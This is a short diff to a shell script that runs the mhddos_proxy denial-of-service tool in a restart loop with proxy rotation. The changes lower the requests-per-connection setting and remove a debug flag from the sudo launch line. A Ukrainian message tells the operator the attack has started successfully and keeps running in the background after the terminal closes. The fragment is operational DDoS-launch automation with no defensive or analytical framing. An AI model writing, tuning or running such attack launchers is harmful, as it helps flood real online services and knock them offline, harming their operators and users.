@@ -16,7 +16,7 @@ restart_interval="3m"
 
 #parameters that passed to python scrypt
 #threads="-t 1000"
-rpc="--rpc 200"
+rpc="--rpc 100"
 proxy_interval="-p 600"
 
 #Just in case kill previous copy of mhddos_proxy
@@ -72,7 +72,7 @@ do
             echo "$cmd_line $proxy_interval $rpc"
             
             cd ~/mhddos_proxy
-            sudo python3 $cmd_line $proxy_interval $rpc --debug&
+            sudo python3 $cmd_line $proxy_interval $rpc&
             #nohup sudo python3 $cmd_line $proxy_interval $rpc </dev/null &>/dev/null &
             echo -e "Атаку розпочато успішно, не переймайтеся, що нічого не виводиться на екран – атака запущена у фоні, щоб вона не завершилася при закритті терміналу"
    done
